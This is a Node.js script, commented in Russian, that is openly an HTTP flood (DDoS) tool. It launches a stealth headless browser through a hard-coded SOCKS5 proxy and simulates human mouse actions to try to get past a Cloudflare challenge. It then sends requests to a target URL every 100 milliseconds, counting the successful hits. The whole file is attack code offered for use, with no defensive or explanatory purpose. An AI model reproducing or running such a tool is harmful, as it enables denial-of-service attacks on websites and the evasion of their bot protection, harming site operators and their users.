const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { SocksProxyAgent } = require('socks-proxy-agent');
const axios = require('axios');

// Инициализация
const PROXY = 'socks5://64.69.43.232:1080';
const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

// Конфигурация stealth
const stealth = StealthPlugin();
stealth.enabledEvasions.delete('user-agent-override');
puppeteer.use(stealth);

async function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function launchBrowser() {
    return await puppeteer.launch({
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            `--proxy-server=${PROXY.split('://')[1]}`,
            '--disable-gpu',
            '--lang=en-US,en'
        ],
        ignoreHTTPSErrors: true
    });
}

async function solveCloudflare(page) {
    try {
        console.log('Обход защиты Cloudflare...');
        
        // Проверка наличия challenge
        const challengeForm = await page.$('#challenge-form');
        if (!challengeForm) return true;

        // Эмуляция человеческого поведения
        await page.mouse.move(100, 100);
        await sleep(2000);
        await page.mouse.click(100, 100, { delay: 150 });
        
        // Решение JavaScript challenge
        await page.evaluate(() => {
            if (typeof window.___cf_chl_opt === 'object') {
                window.___cf_chl_opt.onLoad();
            }
            document.querySelector('#challenge-form input[type="submit"]')?.click();
        });
        
        await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 60000 });
        return true;
    } catch (error) {
        console.error('Ошибка при обходе:', error.message);
        return false;
    }
}

async function runAttack() {
    const targetUrl = 'https://uam.dstat123.uk/91d3e5fd-1b84-46ae-8273-5447dd8fe535';
    let browser;

    try {
        browser = await launchBrowser();
        const page = await browser.newPage();
        
        // Настройка сессии
        await page.setUserAgent(USER_AGENT);
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Chromium";v="120", "Google Chrome";v="120"'
        });

        console.log('Переход на целевой URL...');
        await page.goto(targetUrl, {
            waitUntil: 'domcontentloaded',
            timeout: 60000
        });

        // Обход защиты
        if (!await solveCloudflare(page)) {
            throw new Error('Cloudflare блокирует доступ');
        }

        console.log('Успешное подключение! Начинаем флуд...');
        startRequests(targetUrl);

    } catch (error) {
        console.error('Ошибка:', error.message);
    } finally {
        if (browser) await browser.close();
    }
}

function startRequests(targetUrl) {
    const agent = new SocksProxyAgent(PROXY);
    let count = 0;

    const interval = setInterval(async () => {
        try {
            await axios.get(targetUrl, {
                httpsAgent: agent,
                timeout: 5000,
                headers: {
                    'User-Agent': USER_AGENT,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                }
            });
            count++;
            process.stdout.write('.');
        } catch {
            process.stdout.write('x');
        }
    }, 100);

    // Статистика
    setInterval(() => {
        console.log(`\nУспешных запросов: ${count}`);
    }, 10000);
}

// Запуск
runAttack().catch(console.error);
